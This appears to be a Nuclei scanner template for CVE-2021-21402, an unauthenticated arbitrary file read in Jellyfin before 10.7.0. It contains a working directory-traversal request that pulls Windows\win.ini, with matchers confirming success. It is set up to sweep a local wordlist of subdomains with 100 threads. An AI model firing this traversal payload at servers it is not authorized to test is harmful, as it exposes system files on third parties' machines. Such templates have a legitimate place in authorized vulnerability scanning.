id: CVE-2021-21402 1

info:
  name: Jellyfin prior to 10.7.0 Unauthenticated Arbitrary File Read
  author: dwisiswant0
  severity: high
  description: |
    Jellyfin allows unauthenticated arbitrary file read. This issue is more prevalent when
    Windows is used as the host OS. Servers that are exposed to the public Internet are
    potentially at risk. This is fixed in version 10.7.1.
  reference: https://securitylab.github.com/advisories/GHSL-2021-050-jellyfin/
  tags: cve,cve2021,jellyfin,lfi

requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100

    raw:
      - |
        GET /Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/ HTTP/1.1
        Host: {{Subdomains}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Content-Type: application/octet-stream"
        part: header
      - type: regex
        regex:
          - "\\[(font|extension|file)s\\]"
        part: body